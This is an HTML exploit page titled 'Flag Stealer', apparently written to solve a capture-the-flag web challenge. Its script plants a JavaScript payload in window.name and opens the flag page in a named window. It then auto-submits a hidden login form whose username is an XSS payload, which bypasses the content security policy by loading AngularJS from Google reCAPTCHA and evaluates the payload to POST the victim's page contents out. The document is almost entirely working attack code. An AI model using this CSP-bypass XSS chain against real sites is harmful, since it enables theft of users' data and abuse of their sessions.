<!DOCTYPE html>
<html>
<head>
    <title>Flag Stealer</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <script>
    // According to friend's explanation, all actions must be in the same tab
    // 1. open("http://web:11202/flag/", "fuck") - opens flag page in named window
    // 2. Login with XSS username  
    // 3. XSS executes: eval(name) where name contains the payload
    
    // Step 1: Set window.name with the payload
    // window.name persists across same-origin navigations!
    // The payload POSTs open("", "fuck").document.body.innerHTML to /api/flag
    window.name = "fetch('/api/flag/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body:'content='+encodeURIComponent(open('','fuck').document.body.innerHTML)})";
    
    // Step 2: Open the flag page in a named window
    // This creates a window named "fuck" that we can access later with open("", "fuck")
    open('http://web:11202/flag/', 'fuck');
    
    // Step 3: Login with XSS username
    // The login will navigate to the web app and trigger the flash message with XSS
    // The XSS will execute eval(name), which evaluates window.name (the payload)
    setTimeout(function() {
        // Create and submit login form
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://web:11202/login';
        form.style.display = 'none';
        
        var usernameInput = document.createElement('input');
        usernameInput.type = 'text';
        usernameInput.name = 'username';
        // XSS username with AngularJS CSP bypass
        // <script> loads AngularJS from Google reCAPTCHA (allowed by CSP)
        // <d ng-init=...> uses AngularJS to execute eval(name)
        // {request.session} is injected after HTML encoding via format string
        usernameInput.value = '<script src=https://www.google.com/recaptcha/about/js/main.min.js></script><d ng-init=[].pop.constructor("eval(name)")()>{request.session}';
        
        var passwordInput = document.createElement('input');
        passwordInput.type = 'password';
        passwordInput.name = 'password';
        passwordInput.value = 'password123456';
        
        form.appendChild(usernameInput);
        form.appendChild(passwordInput);
        document.body.appendChild(form);
        form.submit();
    }, 1000);
    </script>
</body>
</html>

